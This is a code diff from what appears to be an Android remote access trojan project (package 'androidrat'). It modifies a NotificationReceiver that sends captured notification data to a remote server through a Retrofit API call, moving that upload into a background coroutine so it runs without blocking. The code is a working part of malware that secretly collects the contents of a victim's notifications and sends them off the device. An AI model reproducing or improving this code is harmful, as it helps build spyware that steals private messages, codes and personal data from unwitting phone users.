@@ -7,6 +7,9 @@ import android.util.Log
 import com.nqmgaming.androidrat.core.util.Constant
 import com.nqmgaming.androidrat.data.ApiService
 import com.nqmgaming.androidrat.data.dto.NotificationDto
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 import retrofit2.Retrofit
 import retrofit2.converter.gson.GsonConverterFactory
 
@@ -40,11 +43,13 @@ class NotificationReceiver : BroadcastReceiver() {
                 val apiService = retrofit.create(ApiService::class.java)
 
 
-                apiService.postNotification(notificationDto).execute().let { response ->
-                    if (response.isSuccessful) {
+                CoroutineScope(Dispatchers.IO).launch {
+                    try {
+                        val response = apiService.postNotification(notificationDto)
+                        val responseBody = response.execute().body()
                         println("Notification sent successfully")
-                    } else {
-                        println("Failed to send notification" + response.errorBody()?.string() + response.code() + response.message())
+                    } catch (e: Exception) {
+                        println("Error sending notification: ${e.message}")
                     }
                 }
 
